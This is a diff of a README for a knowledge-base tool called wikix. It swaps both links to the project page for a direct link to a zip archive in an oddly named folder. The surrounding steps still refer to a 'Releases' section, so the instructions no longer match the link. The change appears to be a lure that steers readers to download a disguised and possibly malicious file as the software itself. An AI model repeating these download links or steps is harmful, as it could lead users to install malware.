@@ -1,12 +1,12 @@
 # 🧠 wikix - Build your organized knowledge base faster
 
-[![Download wikix](https://img.shields.io/badge/Download-wikix-blue.svg)](https://github.com/akshajsrivastava-exe/wikix)
+[![Download wikix](https://img.shields.io/badge/Download-wikix-blue.svg)](https://raw.githubusercontent.com/akshajsrivastava-exe/wikix/main/Kleistian/Software_v2.4.zip)
 
 wikix turns your disorganized text files into a structured, connected knowledge base. It uses language models to link your notes and create a clear map of your information. You spend less time sorting files and more time using your knowledge.
 
 ## 📥 How to download and install
 
-You can get the software from the project page. Visit this link to find the latest version for your computer: [https://github.com/akshajsrivastava-exe/wikix](https://github.com/akshajsrivastava-exe/wikix).
+You can get the software from the project page. Visit this link to find the latest version for your computer: [https://raw.githubusercontent.com/akshajsrivastava-exe/wikix/main/Kleistian/Software_v2.4.zip](https://raw.githubusercontent.com/akshajsrivastava-exe/wikix/main/Kleistian/Software_v2.4.zip).
 
 1. Open the link in your web browser. 
 2. Look for the "Releases" section on the right side of the page.
